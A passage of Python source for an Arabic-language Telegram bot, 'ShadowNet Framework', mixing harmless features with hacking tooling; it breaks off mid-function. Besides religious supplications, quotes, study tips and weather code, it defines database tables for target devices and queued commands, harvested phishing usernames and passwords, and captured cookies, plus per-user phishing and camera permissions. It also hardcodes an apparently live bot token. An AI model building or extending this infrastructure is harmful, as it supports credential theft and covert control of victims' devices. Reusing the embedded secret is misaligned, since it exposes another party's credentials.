# -*- coding: utf-8 -*-

"""
ShadowNet Framework v12.0 - النسخة النهائية المستقرة
جميع الميزات تعمل بشكل حقيقي وكامل
"""

# ===================== الاستيرادات =====================
import os
import sys
import time
import json
import logging
import re
import secrets
import string
import sqlite3
import hashlib
import subprocess
import platform
import socket
import threading
import random
import shutil
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote, unquote
from io import BytesIO
from collections import defaultdict
import functools
import queue
import signal

try:
    from PIL import Image, ImageDraw, ImageFont
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import requests
    from flask import Flask, request, jsonify, abort, render_template_string, send_file
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    import dns.resolver
    import whois
    import paramiko
    from scapy.all import ARP, Ether, send, srp
    import yt_dlp
    import pypdf
    from bs4 import BeautifulSoup
    import googletrans
    from googletrans import Translator
    from gtts import gTTS
    import wikipedia
    import feedparser
    import ssl
except ImportError as e:
    print(f"مكتبة مفقودة: {e}")
    sys.exit(1)

# ===================== الإعدادات الأساسية =====================
TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
ADMIN_ID = 7965377136
SERVER_URL = os.environ.get('RENDER_EXTERNAL_URL', 'https://my-t99-bot.onrender.com')
PORT = int(os.environ.get('PORT', 5000))
API_KEY = secrets.token_hex(32)

VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
NUMVERIFY_API_KEY = os.environ.get('NUMVERIFY_API_KEY', '')
SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp.gmail.com')
SMTP_PORT = int(os.environ.get('SMTP_PORT', 587))
SMTP_USER = os.environ.get('SMTP_USER', 'your-email@gmail.com')
SMTP_PASS = os.environ.get('SMTP_PASS', 'your-password')

# ===================== إعدادات Flask =====================
app = Flask(__name__)

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ===================== قاعدة البيانات =====================
DB_PATH = 'shadownet.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY,
        is_admin INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0,
        points INTEGER DEFAULT 10,
        referral_code TEXT UNIQUE,
        referred_by INTEGER,
        created_at TEXT,
        last_seen TEXT,
        can_use_collector INTEGER DEFAULT 0,
        can_use_camera INTEGER DEFAULT 0,
        can_use_phishing INTEGER DEFAULT 0,
        can_use_advanced INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_tokens (
        chat_id INTEGER PRIMARY KEY,
        token TEXT UNIQUE
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS chat_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        from_user INTEGER,
        to_user INTEGER,
        message TEXT,
        timestamp TEXT,
        is_bot_reply INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        action TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS targets (device_id TEXT PRIMARY KEY, name TEXT, type TEXT, ip TEXT, os TEXT, status TEXT, last_seen TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command TEXT, executed INTEGER DEFAULT 0, result TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS collected_data (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, data_type TEXT, data TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, scan_type TEXT, results TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS points_log (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, reason TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, target_email TEXT, platform TEXT, username TEXT, password TEXT, ip TEXT, created_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_state (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS intrusion_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, endpoint TEXT, method TEXT, user_agent TEXT, timestamp TEXT, details TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reminders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        message TEXT,
        remind_time TEXT,
        created_at TEXT,
        is_active INTEGER DEFAULT 1
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS cookie_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        url TEXT,
        cookies TEXT,
        ip TEXT,
        user_agent TEXT,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS short_urls (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        original_url TEXT,
        short_code TEXT UNIQUE,
        created_by INTEGER,
        created_at TEXT,
        clicks INTEGER DEFAULT 0
    )''')
    try:
        c.execute("ALTER TABLE users ADD COLUMN can_use_camera INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_phishing INTEGER DEFAULT 0")
        c.execute("ALTER TABLE users ADD COLUMN can_use_advanced INTEGER DEFAULT 0")
    except:
        pass
    c.execute("INSERT OR IGNORE INTO users (chat_id, is_admin, points, created_at, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced) VALUES (?, 1, 999, ?, 1, 1, 1, 1)", 
              (ADMIN_ID, datetime.now().isoformat()))
    c.execute("UPDATE users SET is_admin = 1, can_use_collector = 1, can_use_camera = 1, can_use_phishing = 1, can_use_advanced = 1 WHERE chat_id = ?", (ADMIN_ID,))
    c.execute("INSERT OR IGNORE INTO user_tokens (chat_id, token) VALUES (?, ?)", (ADMIN_ID, secrets.token_urlsafe(16)))
    conn.commit()
    conn.close()

init_db()

# ===================== المحتوى الإسلامي =====================
ISLAMIC_DATA = {
    "adkar_sabah": [
        "أصبحنا وأصبح الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذا اليوم وخير ما بعده، وأعوذ بك من شر ما في هذا اليوم وشر ما بعده، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
        "اللهم بك أصبحنا، وبك أمسينا، وبك نحيا، وبك نموت، وإليك النشور.",
        "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
        "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
    ],
    "adkar_massaa": [
        "أمسينا وأمسى الملك لله، والحمد لله، لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير. رب أسألك خير ما في هذه الليلة وخير ما بعدها، وأعوذ بك من شر ما في هذه الليلة وشر ما بعدها، رب أعوذ بك من الكسل وسوء الكبر، رب أعوذ بك من عذاب في النار وعذاب في القبر.",
        "اللهم بك أمسينا، وبك أصبحنا، وبك نحيا، وبك نموت، وإليك المصير.",
        "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك، وأنا على عهدك ووعدك ما استطعت، أعوذ بك من شر ما صنعت، أبوء لك بنعمتك علي، وأبوء بذنبي فاغفر لي، فإنه لا يغفر الذنوب إلا أنت.",
        "اللهم إني أسألك العفو والعافية في الدنيا والآخرة، اللهم إني أسألك العفو والعافية في ديني ودنياي وأهلي ومالي، اللهم استر عوراتي وآمن روعاتي، اللهم احفظني من بين يدي ومن خلفي وعن يميني وعن شمالي ومن فوقي، وأعوذ بعظمتك أن أغتال من تحتي."
    ],
    "doaa": {
        "سفر": [
            "اللهم إن نسألك في سفرنا هذا البر والتقوى، ومن العمل ما ترضى، اللهم هون علينا سفرنا هذا واطو عنا بعده، اللهم أنت الصاحب في السفر والخليفة في الأهل، اللهم إني أعوذ بك من وعثاء السفر، وكآبة المنظر، وسوء المنقلب في المال والأهل.",
            "سبحان الذي سخر لنا هذا وما كنا له مقرنين، وإنا إلى ربنا لمنقلبون."
        ],
        "هم": [
            "اللهم إني أعوذ بك من الهم والحزن، وأعوذ بك من العجز والكسل، وأعوذ بك من الجبن والبخل، وأعوذ بك من غلبة الدين وقهر الرجال.",
            "لا إله إلا الله العظيم الحليم، لا إله إلا الله رب العرش العظيم، لا إله إلا الله رب السموات ورب الأرض رب العرش الكريم.",
            "اللهم رحمتك أرجو، فلا تكلني إلى نفسي طرفة عين، وأصلح لي شأني كله، لا إله إلا أنت."
        ],
        "رزق": [
            "اللهم اكفني بحلالك عن حرامك، وأغنني بفضلك عمن سواك.",
            "اللهم إني أسألك علماً نافعاً، ورزقاً طيباً، وعملاً متقبلاً.",
            "اللهم رب السموات ورب الأرض ورب العرش العظيم، ربنا ورب كل شيء، فالق الحب والنوى، ومنزل التوراة والإنجيل والفرقان، أعوذ بك من شر كل شيء أنت آخذ بناصيته، اللهم أنت الأول فليس قبلك شيء، وأنت الآخر فليس بعدك شيء، وأنت الظاهر فليس فوقك شيء، وأنت الباطن فليس دونك شيء، اقض عنا الدين وأغننا من الفقر."
        ],
        "نوم": [
            "اللهم باسمك أموت وأحيا.",
            "اللهم أسلمت نفسي إليك، ووجهت وجهي إليك، وفوضت أمري إليك، وألجأت ظهري إليك، رغبة ورهبة إليك، لا ملجأ ولا منجا منك إلا إليك، آمنت بكتابك الذي أنزلت، ونبيك الذي أرسلت.",
            "اللهم قني عذابك يوم تبعث عبادك."
        ],
        "فرج": [
            "لا إله إلا الله الحليم الكريم، سبحان الله رب العرش العظيم، الحمد لله رب العالمين، أسألك موجبات رحمتك، وعزائم مغفرتك، والغنيمة من كل بر، والسلامة من كل إثم، لا تدع لي ذنباً إلا غفرته، ولا هماً إلا فرجته، ولا حاجة هي لك رضاً إلا قضيتها يا أرحم الراحمين.",
            "اللهم إني عبدك، ابن عبدك، ابن أمتك، ناصيتي بيدك، ماضٍ في حكمك، عدل في قضاؤك، أسألك بكل اسم هو لك، سميت به نفسك، أو أنزلته في كتابك، أو علمته أحداً من خلقك، أو استأثرت به في علم الغيب عندك، أن تجعل القرآن ربيع قلبي، ونور صدري، وجلاء حزني، وذهاب همي."
        ]
    },
    "arkan_islam": "🕌 أركان الإسلام الخمسة:\n\n1. شهادة أن لا إله إلا الله وأن محمداً رسول الله.\n2. إقام الصلاة.\n3. إيتاء الزكاة.\n4. صوم رمضان.\n5. حج البيت لمن استطاع إليه سبيلاً.\n\nوالدليل: عن ابن عمر رضي الله عنهما قال: قال رسول الله ﷺ: «بُني الإسلام على خمس: شهادة أن لا إله إلا الله وأن محمداً رسول الله، وإقام الصلاة، وإيتاء الزكاة، وصوم رمضان، وحج البيت» (متفق عليه).",
    "arkan_iman": "📖 أركان الإيمان الستة:\n\n1. الإيمان بالله.\n2. الإيمان بملائكته.\n3. الإيمان بكتبه.\n4. الإيمان برسله.\n5. الإيمان باليوم الآخر.\n6. الإيمان بالقدر خيره وشره.\n\nوالدليل: قال رسول الله ﷺ: «أن تؤمن بالله، وملائكته، وكتبه، ورسله، واليوم الآخر، وتؤمن بالقدر خيره وشره» (رواه مسلم).",
    "wudu": "💧 خطوات الوضوء الصحيح (من السنة النبوية):\n\n1. النية (في القلب).\n2. التسمية (بسم الله).\n3. غسل الكفين ثلاث مرات.\n4. المضمضة والاستنشاق ثلاث مرات (بغرفة واحدة).\n5. غسل الوجه ثلاث مرات (من منبت الشعر إلى الذقن، ومن الأذن إلى الأذن).\n6. غسل اليدين إلى المرفقين ثلاث مرات (الأيمن ثم الأيسر).\n7. مسح الرأس مرة واحدة (مع الأذنين).\n8. غسل الرجلين إلى الكعبين ثلاث مرات (الأيمن ثم الأيسر).\n9. الدعاء بعد الوضوء: «أشهد أن لا إله إلا الله وحده لا شريك له، وأشهد أن محمداً عبده ورسوله».\n\nوالدليل: قال رسول الله ﷺ: «من توضأ فأحسن الوضوء، ثم قال: أشهد أن لا إله إلا الله وحده لا شريك له، وأشهد أن محمداً عبده ورسوله، فتحت له أبواب الجنة الثمانية» (رواه الترمذي).",
    "ghusl": "🚿 صفة الغسل الكامل (الجنابة) من السنة النبوية:\n\n1. النية (في القلب).\n2. غسل الكفين ثلاث مرات.\n3. غسل الفرج وما حوله.\n4. يتوضأ وضوءه للصلاة (غسل الوجه، اليدين، مسح الرأس، وغسل الرجلين).\n5. يخلل الماء في شعر رأسه حتى يصل إلى أصول الشعر، ثم يفيض الماء على رأسه ثلاث مرات.\n6. يغسل بقية جسده، يبدأ بالشق الأيمن ثم الأيسر، ويدلك جسده بيديه.\n\nوالدليل: عن عائشة رضي الله عنها قالت: «كان رسول الله ﷺ إذا اغتسل من الجنابة، يبدأ فيغسل يديه، ثم يفرغ بيمينه على شماله فيغسل فرجه، ثم يتوضأ وضوءه للصلاة، ثم يأخذ الماء فيدخل أصابعه في أصول الشعر، ثم يحثي على رأسه ثلاث حثيات، ثم يفيض الماء على سائر جسده» (متفق عليه)."
}

# ===================== دوال مساعدة قاعدة البيانات =====================
def safe_db_query(query, params=(), fetch_one=True, default=None):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            result = c.fetchone()
        else:
            result = c.fetchall()
        conn.close()
        return result if result is not None else default
    except Exception as e:
        logger.error(f"خطأ في قاعدة البيانات: {e}")
        return default

def safe_db_execute(query, params=()):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute(query, params)
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        logger.error(f"خطأ في تنفيذ قاعدة البيانات: {e}")
        return False

# ===================== دوال مساعدة أساسية =====================
def is_admin(chat_id):
    row = safe_db_query("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def is_banned(chat_id):
    row = safe_db_query("SELECT is_banned FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def get_user_points(chat_id):
    row = safe_db_query("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
    return row[0] if row else 0

def user_can_use_collector(chat_id):
    row = safe_db_query("SELECT can_use_collector FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_camera(chat_id):
    row = safe_db_query("SELECT can_use_camera FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_phishing(chat_id):
    row = safe_db_query("SELECT can_use_phishing FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def user_can_use_advanced(chat_id):
    row = safe_db_query("SELECT can_use_advanced FROM users WHERE chat_id = ?", (chat_id,))
    return row and row[0] == 1

def add_points(chat_id, amount, reason):
    if safe_db_execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, amount, reason, datetime.now().isoformat()))

def deduct_points(chat_id, amount, reason):
    points = get_user_points(chat_id)
    if points < amount:
        return False
    if safe_db_execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id)):
        safe_db_execute("INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                        (chat_id, -amount, reason, datetime.now().isoformat()))
        return True
    return False

def generate_user_token(chat_id):
    token = secrets.token_urlsafe(16)
    safe_db_execute("INSERT OR REPLACE INTO user_tokens (chat_id, token) VALUES (?, ?)", (chat_id, token))
    return token

def get_user_token(chat_id):
    row = safe_db_query("SELECT token FROM user_tokens WHERE chat_id = ?", (chat_id,))
    if row:
        return row[0]
    return generate_user_token(chat_id)

def get_chat_id_by_token(token):
    row = safe_db_query("SELECT chat_id FROM user_tokens WHERE token = ?", (token,))
    if row:
        return row[0]
    return None

def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def get_referral_code(chat_id):
    row = safe_db_query("SELECT referral_code FROM users WHERE chat_id = ?", (chat_id,))
    if row and row[0]:
        return row[0]
    code = generate_referral_code()
    safe_db_execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (code, chat_id))
    return code

def safe_send(chat_id, text, reply_markup=None, parse_mode='HTML'):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode, timeout=60)
    except Exception as e:
        logger.error(f"safe_send error to {chat_id}: {e}")
        return None

def notify_admin(msg):
    safe_send(ADMIN_ID, f"📢 إشعار: {msg}")

def log_activity(chat_id, action):
    safe_db_execute("INSERT INTO user_activity (chat_id, action, timestamp) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.now().isoformat()))

def update_last_seen(chat_id):
    safe_db_execute("UPDATE users SET last_seen = ? WHERE chat_id = ?", (datetime.now().isoformat(), chat_id))

def get_user_name(chat_id):
    try:
        user = bot.get_chat(chat_id)
        if user.first_name:
            return user.first_name
        elif user.username:
            return f"@{user.username}"
        else:
            return str(chat_id)
    except:
        return str(chat_id)

def create_welcome_image(user_name):
    if not PIL_AVAILABLE:
        return None
    try:
        img = Image.new('RGB', (800, 400), color=(10, 10, 30))
        draw = ImageDraw.Draw(img)
        for i in range(5):
            color = (50 + i*20, 50 + i*20, 150 + i*20)
            draw.rectangle([i*2, i*2, 800-i*2, 400-i*2], outline=color, width=2)
        try:
            font_large = ImageFont.truetype("arial.ttf", 50)
            font_small = ImageFont.truetype("arial.ttf", 30)
        except:
            font_large = ImageFont.load_default()
            font_small = ImageFont.load_default()
        draw.ellipse([300, 60, 500, 260], outline=(0, 150, 255), width=4)
        draw.ellipse([350, 110, 450, 210], outline=(0, 200, 255), width=2)
        draw.line([400, 60, 400, 40], fill=(0, 150, 255), width=3)
        draw.line([370, 40, 430, 40], fill=(0, 150, 255), width=3)
        draw.text((400, 280), f"مرحباً {user_name}", fill=(200, 200, 255), anchor="mm", font=font_large)
        draw.text((400, 330), "كيان إلكتروني متطور", fill=(100, 150, 255), anchor="mm", font=font_small)
        draw.text((400, 365), "جاهز لخدمتك", fill=(100, 150, 255), anchor="mm", font=font_small)
        path = f"welcome_{int(time.time())}.png"
        img.save(path)
        return path
    except Exception as e:
        logger.error(f"create_welcome_image error: {e}")
        return None

# ===================== دوال الاقتباسات (غير محدودة) =====================
QUOTES_ARABIC = {
    'حزين': [
        "الفراق مؤلم ولكن الحياة تستمر، فلا تدع الحزن يسيطر على قلبك، فكل شيء يمر.",
        "الوحدة قاسية لكنها تعلمنا الصبر، وتجعلنا أقوى مما كنا عليه من قبل.",
        "الحزن زائر عابر، لا تدعه يسكن قلبك، فهو ليس ضيفاً دائماً في حياتنا.",
        "في قلب كل جرح حكمة، وفي كل دموع دعاء، الألم معلم قاسي لكن دروسه لا تنسى.",
        "في لحظات الحزن تتجلى قوة الروح، وتظهر معادن الرجال الحقيقية.",
        "الدموع تغسل الروح وتطهرها، فلا تخف من البكاء فهو شفاء للقلب.",
        "الحزن جزء من الحياة، لكنه ليس كلها، بعد العاصفة يأتي الهدوء دائماً.",
        "الجراح تلتئم مع الوقت، والذكرى تبقى درساً نتعلم منه كيف نكون أقوى.",
        "الحزن يعلّمنا كيف نقدر الفرح، وكيف نستمتع باللحظات الجميلة حين تأتي.",
        "لا تدع الحزن يسرق ابتسامتك، فالحياة أجمل مما تتخيل."
    ],
    'عميق': [
        "الحياة رحلة قصيرة، عشها بوعي وتأمل، فكل لحظة فيها فرصة لا تعوض.",
        "الروح تتوق إلى ما لا تراه العين، وتسعى للبحث عن الحقيقة في أعماق الوجود.",
        "أعمق الجروح هي التي لا ترى بالعين، فهي جروح الروح التي تحتاج إلى صبر.",
        "الصمت أحياناً يكون أبلغ من الكلام، فهو لغة الحكماء في أوقات الشدة.",
        "في أعماق النفس كنوز لا تكتشف إلا بالصبر والتأمل العميق في الذات.",
        "الحكمة تأتي من التجارب لا من الكتب، فالحياة هي أستاذنا الأكبر.",
        "الوجود لغز، والحياة محاولة لفهم هذا اللغز من خلال التأمل والتفكر.",
        "كل إنسان يحمل عالماً بداخله، عالماً من الأحلام والطموحات والمشاعر.",
        "السكينة في القلب، لا في المكان، فاطمئنان الروح هو أعلى درجات السلام."
    ],
    'جميل': [
        "الحب نور يضيء القلوب المظلمة، ويمنح الحياة معنى وجمالاً لا يوصف.",
        "الأمل يبقى آخر ما يموت في النفس، فهو شمعة تضيء دروبنا المظلمة.",
        "الجمال الحقيقي في الروح الطيبة، وفي القلب النقي الذي يحب الخير للجميع.",
        "ابتسامة صادقة تغير العالم، فهي لغة لا تحتاج إلى ترجمة.",
        "الجمال في العين التي ترى الخير، وفي القلب الذي يشعر بالجمال.",
        "اللحظات الجميلة تبقى في الذاكرة، وتصبح كنزاً نحمله معنا طوال العمر.",
        "الحياة جميلة عندما ننظر إليها بإيجابية، ونرى الخير في كل شيء حولنا.",
        "الأشياء الجميلة تأتي لمن ينتظر، ولمن يؤمن بأن الغد سيكون أفضل.",
        "الجمال الحقيقي هو انعكاس للروح، فكن جميلاً في داخلك ترى الجمال في كل شيء."
    ]
}

QUOTES_ENGLISH = {
    'sad': [
        "Goodbye is painful, but life goes on. Sadness is a visitor, don't let it stay forever.",
        "Loneliness is harsh, but it teaches patience and makes us stronger.",
        "In every wound there is wisdom, and in every tear there is a prayer.",
        "In moments of sadness, the strength of the soul is revealed.",
        "Tears cleanse the soul and purify it, don't be afraid to cry.",
        "Sadness is part of life, but it's not all of it. After the storm comes calm.",
        "Wounds heal with time, and memories become lessons that make us stronger.",
        "Sadness teaches us how to appreciate joy and beautiful moments.",
        "Don't let sadness steal your smile, life is more beautiful than you imagine."
    ],
    'deep': [
        "Life is a short journey, live it consciously and with awareness.",
        "The soul yearns for what the eye cannot see, seeking truth in the depths of existence.",
        "The deepest wounds are those unseen, wounds of the soul that require patience.",
        "Silence is sometimes louder than words, the language of the wise.",
        "In the depths of the soul lie treasures discovered only through patience and meditation.",
        "Wisdom comes from experience, not from books. Life is our greatest teacher.",
        "Existence is a mystery, and life is an attempt to understand it.",
        "Every human carries a world within, a world of dreams, ambitions, and emotions.",
        "Peace is in the heart, not in the place. Inner peace is the highest form of tranquility."
    ],
    'beautiful': [
        "Love is a light that illuminates dark hearts and gives life meaning.",
        "Hope remains the last thing to die in the soul, a candle in the darkness.",
        "True beauty lies in the kind soul and the pure heart that loves goodness.",
        "A sincere smile changes the world, a language that needs no translation.",
        "Beauty is in the eye that sees good and in the heart that feels beauty.",
        "Beautiful moments stay in memory and become treasures we carry forever.",
        "Life is beautiful when we look at it positively and see the good in everything.",
        "Beautiful things come to those who wait and believe in a better tomorrow.",
        "True beauty is a reflection of the soul, so be beautiful inside and you will see beauty everywhere."
    ]
}

def get_random_quote(lang='arabic', category='sad', index=None):
    if lang == 'arabic':
        quotes_dict = QUOTES_ARABIC
        if category in quotes_dict:
            if index is not None and index < len(quotes_dict[category]):
                return quotes_dict[category][index], index
            return random.choice(quotes_dict[category]), None
    else:
        quotes_dict = QUOTES_ENGLISH
        if category in quotes_dict:
            if index is not None and index < len(quotes_dict[category]):
                return quotes_dict[category][index], index
            return random.choice(quotes_dict[category]), None
    all_quotes = []
    for cat in quotes_dict.values():
        all_quotes.extend(cat)
    if index is not None and index < len(all_quotes):
        return all_quotes[index], index
    return random.choice(all_quotes), None

# ===================== دوال النصائح =====================
TIPS = {
    'دراسية': [
        "خصص وقتاً منتظماً للمذاكرة يومياً، فالاستمرارية أهم من الكمية.",
        "راجع دروسك قبل النوم لترسيخ المعلومات في الذاكرة طويلة المدى.",
        "استخدم تقنية البومودورو للتركيز: 25 دقيقة عمل و5 دقائق راحة.",
        "اكتب ملخصاتك بيدك لتثبيت المعلومة، فالكتابة تعزز الحفظ.",
        "قسّم المواد الكبيرة إلى أجزاء صغيرة لتسهل دراستها وفهمها.",
        "استخدم ألواناً مختلفة للملاحظات لتنظيم المعلومات بصرياً.",
        "ادرس في مكان هادئ ومريح بعيداً عن المشتتات.",
        "خذ فترات راحة قصيرة بين المذاكرة لتجديد النشاط والتركيز."
    ],
    'اجتماعية': [
        "كن صادقاً مع أصدقائك في كل الأوقات، فالصدق أساس العلاقات الناجحة.",
        "استمع أكثر مما تتحدث، فالاستماع الجيد يجعلك تتعلم وتفهم الآخرين.",
        "الاحترام المتبادل أساس العلاقات الناجحة، عامِل الناس كما تحب أن يعاملوك.",
        "ساعد الآخرين دون انتظار مقابل، فالعطاء الحقيقي هو عطاء الروح.",
        "ابتسم للناس تبتسم لك الحياة، فالابتسامة صدقة وباب للخير.",
        "كن لطيفاً مع الجميع، فاللطف يفتح القلوب ويذيب الجليد.",
        "تعلم فن الاعتذار، فالاعتذار الحقيقي دليل على النضج والتواضع.",
        "لا تحكم على الناس من مظهرهم، فالجوهر الحقيقي في الأخلاق والصفات."
    ],
    'للاكتئاب': [
        "لا تيأس، فالحياة جميلة وسوف تشرق شمس جديدة كل صباح.",
        "اطلب المساعدة من المقربين، لا تتحمل الألم وحدك فالدعم يساعدك.",
        "تذكر أن هذه الأيام ستمر، والألم سيخفف مع الوقت والصبر.",
        "اهتم بنفسك، فصحتك النفسية مهمة، خصص وقتاً للاسترخاء.",
        "مارس الرياضة فهي تخفف التوتر وتفرز هرمونات السعادة.",
        "تحدث مع شخص تثق به، فالكلام يخفف الألم ويشاركك الأحزان.",
        "خصص وقتاً للتأمل والاسترخاء، فالسكينة في القلب وليست في المكان.",
        "تذكر أنك لست وحدك في معاناتك، فالكثيرون يمرون بتجارب مشابهة."
    ],
    'إسلامية': [
        "توكل على الله في كل أمورك، فهو خير وكيل ونعم المولى ونعم النصير.",
        "أكثر من الاستغفار، فهو يفتح أبواب الرزق ويغسل الذنوب.",
        "الصبر مفتاح الفرج، فلا تيأس من رحمة الله، فمع العسر يسراً.",
        "ذكر الله يطمئن القلوب، فأكثر من تسبيحه وتحميده وتكبيره.",
        "صلاتك نور في حياتك، فهي صلة بينك وبين خالقك.",
        "الدعاء سلاح المؤمن، فلا تتركه في كل أمورك الصغيرة والكبيرة.",
        "القرآن شفاء للصدور وراحة للنفوس، فاجعل له ورداً يومياً.",
        "التوكل على الله من أعظم العبادات، فهو يمنحك القوة والثقة."
    ]
}

def get_random_tip(category, index=None):
    if category in TIPS:
        tips_list = TIPS[category]
        if index is not None and index < len(tips_list):
            return tips_list[index], index
        return random.choice(tips_list), None
    all_tips = []
    for tips in TIPS.values():
        all_tips.extend(tips)
    if index is not None and index < len(all_tips):
        return all_tips[index], index
    return random.choice(all_tips), None

# ===================== دوال الطقس (بالصيغة المطلوبة) =====================
def get_weather_detailed(city):
    try:
        url = f"https://wttr.in/{city}?format=j1&lang=ar"
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            current = data.get('current_condition', [{}])[0]
            weather_desc = current.get('weatherDesc', [{}])[0].get('value', 'غير معروف')
            temp_c = current.get('temp_C', 'غير معروف')
            feels_like = current.get('FeelsLikeC', 'غير معروف')
            humidity = current.get('humidity', 'غير معروف')
            wind_speed = current.get('windSpeedKmph', 'غير معروف')
            pressure = current.get('pressure', 'غير معروف')
            visibility = current.get('visibility', 'غير معروف')
            uv_index = current.get('uvIndex', 'غير معروف')
            
            forecast = data.get('weather', [{}])[0]
            max_temp = forecast.get('maxtempC', 'غير معروف')
            min_temp = forecast.get('mintempC', 'غير معروف')
            sunrise = forecast.get('astronomy', [{}])[0].get('sunrise', 'غير معروف')
            sunset = forecast.get('astronomy', [{}])[0].get('sunset', 'غير معروف')
            
            now = datetime.now().strftime("%I:%M %p")
            
            uv_level = "آمنة"
            try:
                uv = int(uv_index)
                if uv >= 1 and uv <= 2:
                    uv_level = "منخفضة"
                elif uv >= 3 and uv <= 5:
                    uv_level = "متوسطة"
                elif uv >= 6 and uv <= 7:
                    uv_level = "عالية"
                elif uv >= 8 and uv <= 10:
                    uv_level = "عالية جداً"
                elif uv > 10:
                    uv_level = "خطيرة"
            except:
                pass
            
            msg = f"🌤️ حالة الطقس في {city}\n"
            msg += f"──────────────────\n"
            msg += f"📍 الحالة العامة: {weather_desc}\n"
            msg += f"🌡️ درجة الحرارة: {temp_c}°C (المحسوسة: {feels_like}°C)\n"
            msg += f"📊 تفاصيل الأجواء:\n"
            msg += f"• المدى الحراري: الصغرى {min_temp}°C | العظمى {max_temp}°C\n"
            msg += f"• الرطوبة: {humidity}%\n"
            msg += f"• الرياح: {wind_speed} كم/ساعة\n"
            msg += f"• الأشعة فوق البنفسجية: {uv_index} ({uv_level})\n"
            msg += f"• الرؤية: {visibility} كم\n"
            msg += f"• الضغط الجوي: {pressure} hPa\n"
            msg += f"🌅 الأوقات:\n"
            msg += f"• شروق الشمس: {sunrise}\n"
            msg += f"• غروب الشمس: {sunset}\n"
            msg += f"🕒 آخر تحديث: {now}"
            return msg
        else:
